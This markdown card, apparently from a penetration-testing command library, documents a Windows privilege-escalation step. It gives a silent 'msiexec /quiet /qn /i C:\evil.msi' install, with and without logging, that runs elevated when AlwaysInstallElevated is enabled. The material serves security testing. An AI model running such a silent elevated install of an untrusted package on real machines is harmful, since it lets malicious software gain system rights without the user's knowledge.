---
id: 07d4154c-a42d-4b2c-be85-aae34cd3ead8
name: msiexec-install-msi-package-silently
type: command
executor: cmd
data: 'msiexec /quiet /qn /i C:\evil.msi'
output: null
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - msiexec
  - installation
  - privesc
verified: true
validated: true
---

# msiexec-install-msi-package-silently

## Command

```cmd
msiexec /quiet /qn /i C:\evil.msi
```

## Description

Silently installs an MSI package on Windows without user interaction or prompts, allowing elevated execution if AlwaysInstallElevated is enabled.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /quiet | Quiet mode (no UI) | Yes |
| /qn | No UI at all | Yes |
| /i | Install mode | Yes |
| C:\evil.msi | Path to MSI file | Yes |

## Examples

### Basic Usage

```cmd
msiexec /quiet /qn /i C:\evil.msi
```

### With Log

```cmd
msiexec /quiet /qn /i C:\evil.msi /l*v install.log
```

## Expected Output

No output if successful (exit code 0); check Windows Event Logs (MsiInstaller) for confirmation or use /l for logging.

## Related

- [[procedures/Windows-AlwaysInstallElevated-Privilege-Escalation]]
